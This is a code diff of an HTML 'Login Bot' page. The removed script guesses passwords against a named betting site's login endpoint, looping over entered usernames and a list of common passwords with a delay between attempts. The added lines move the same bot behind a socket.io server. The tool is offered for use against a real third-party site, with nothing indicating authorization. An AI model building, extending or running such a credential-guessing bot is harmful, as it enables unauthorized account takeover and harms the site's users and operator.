@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Login Bot Tester</title>
+  <title>Login Bot with Real-time Logs</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     body {
@@ -64,7 +64,7 @@
 </head>
 <body>
 
-  <h1>Login Bot Tester</h1>
+  <h1>Login Bot with Real-time Logs</h1>
 
   <div id="usernameFields">
     <input type="text" placeholder="Username 1" />
@@ -78,10 +78,9 @@
 
   <div id="log"></div>
 
+  <script src="/socket.io/socket.io.js"></script>
   <script>
-    const loginUrl = "https://facai988.live/bd/en/account-login-quick"; // লগইন URL
-    const passwords = ["123456", "password", "admin123", "facai@2024", "test123"];
-    const attemptsPerUser = 3;
+    const socket = io();
 
     function addField() {
       const container = document.getElementById("usernameFields");
@@ -97,38 +96,29 @@
       logBox.scrollTop = logBox.scrollHeight;
     }
 
-    async function startBot() {
-      log("🚀 Bot started...\n");
-
+    function startBot() {
       const inputs = document.querySelectorAll("#usernameFields input");
-      for (const input of inputs) {
-        const username = input.value.trim();
-        if (!username) continue;
+      const usernames = [];
+      inputs.forEach(input => {
+        if (input.value.trim()) usernames.push(input.value.trim());
+      });
 
-        for (let i = 0; i < attemptsPerUser; i++) {
-          const password = passwords[Math.floor(Math.random() * passwords.length)];
-
-          try {
-            const res = await fetch(loginUrl, {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/x-www-form-urlencoded"
-              },
-              body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
-            });
-
-            log(`[${username}] Attempt ${i + 1}: Status ${res.status}`);
-          } catch (err) {
-            log(`[${username}] Attempt ${i + 1}: ❌ Failed (${err.message})`);
-          }
-
-          await new Promise(r => setTimeout(r, 1500)); // 1.5 সেকেন্ড বিরতি
-        }
+      if (usernames.length === 0) {
+        log("❌ Please enter at least one username.");
+        return;
       }
 
-      log("✅ Bot finished.");
+      log("🚀 Bot started...\n");
+      socket.emit("startBot", usernames);
     }
-  </script>
 
+    socket.on("botLog", message => {
+      log(message);
+    });
+
+    socket.on("botFinished", () => {
+      log("✅ Bot finished.");
+    });
+  </script>
 </body>
 </html>
